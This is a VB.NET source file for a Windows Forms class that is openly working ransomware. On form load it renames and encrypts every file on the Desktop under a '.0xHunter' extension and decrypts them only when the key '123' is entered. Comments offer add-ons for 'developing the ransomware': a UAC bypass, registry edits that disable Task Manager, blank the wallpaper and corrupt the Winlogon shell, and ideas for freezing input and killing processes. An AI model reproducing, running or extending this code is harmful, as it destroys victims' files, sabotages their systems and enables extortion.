Imports System.IO
Imports Microsoft.Win32

Public Class EncryptDecrypt

    Dim file1 As String
    Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
    Dim LstFiles As New List(Of FileInfo)
    Dim EncryptDecryptFiles As New ClsEncryptDecryptFiles("123")

    Private Sub EncryptDecrypt_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        CheckForIllegalCrossThreadCalls = False
        For Each file1 In My.Computer.FileSystem.GetFiles(path)
            File.Move(file1, file1 + ".0xHunter")
        Next
        Dim Th As New Threading.Thread(AddressOf Encrypt)
        Th.Start()
    End Sub

    Sub Encrypt()
        For Each file1 In My.Computer.FileSystem.GetFiles(path)
            Try
                Dim FileEncrypted = EncryptDecryptFiles.Encryption(file1)
                My.Computer.FileSystem.WriteAllBytes(file1, FileEncrypted, False)
            Catch ex As Exception
            End Try
            Threading.Thread.Sleep(100)
        Next
    End Sub
    Sub Decrypt()
        If TextBox2.Text = "123" Then
            For Each file1 In My.Computer.FileSystem.GetFiles(path)
                Try
                    If file1.ToString.Contains("0xHunter") Then
                        Dim FileDecrypted = EncryptDecryptFiles.Decryption(file1)
                        My.Computer.FileSystem.WriteAllBytes(file1, FileDecrypted, False)
                        Dim newFilePath As String = file1.Replace(".0xHunter", "")
                        File.Move(file1, newFilePath)
                    End If
                Catch ex As Exception
                End Try
                Threading.Thread.Sleep(100)
            Next
            MsgBox("The key is correct, Your files have been decrypted")
        Else
            MsgBox("The key is invalid !")
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim Th As New Threading.Thread(AddressOf Decrypt)
        Th.Start()
    End Sub


    Private Sub Properties()
        ' You can develop the ransomware by adding some features such as :

        'Bypass UAC
        'Process.Start("cmd", "/c SET __COMPAT_LAYER=RunAsInvoker")
        'Disable taskmanager
        'My.Computer.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        'My.Computer.Registry.SetValue("DisableTaskMgr", 1, RegistryValueKind.String)
        'Remove wallpaper desktop
        'RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
        'My.Computer.Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop")
        'My.Computer.Registry.SetValue("Wallpaper", "", RegistryValueKind.String)
        '//If you shutdown your computer, you cant run winodws well
        'My.Computer.Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon")
        'My.Computer.Registry.SetValue("Shell", "empty", RegistryValueKind.String)

        ' Frazee mouse/keyboard + kill proccess + disable command line&Powershell
    End Sub
End Class
